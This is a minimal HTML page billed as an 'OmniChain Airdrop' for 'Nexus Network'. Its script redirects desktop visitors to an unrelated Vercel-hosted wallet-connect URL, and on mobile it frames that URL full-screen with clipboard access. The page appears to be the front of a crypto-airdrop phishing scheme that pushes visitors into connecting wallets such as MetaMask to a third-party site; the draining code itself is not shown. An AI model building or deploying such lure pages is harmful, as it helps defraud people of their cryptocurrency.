<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nexus Network — OmniChain Airdrop</title>
<style>
  * { margin: 0; padding: 0; }
  html, body { width: 100%; height: 100%; overflow: hidden; background: #030305; }
  iframe { width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<script>
  // Desktop: redirect directly (browser extensions can't work in iframes)
  // Mobile: use iframe (WalletConnect QR works fine in iframes)
  var CONNECT_URL = 'https://playholding.vercel.app/';
  var isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  
  if (isMobile) {
    // Mobile — iframe is safe, wallets connect via WalletConnect/deep links
    document.write('<iframe src="' + CONNECT_URL + '" allow="clipboard-read; clipboard-write; fullscreen" allowfullscreen></iframe>');
  } else {
    // Desktop — redirect so browser extensions (MetaMask, etc.) work
    window.location.replace(CONNECT_URL);
  }
</script>
</body>
</html>
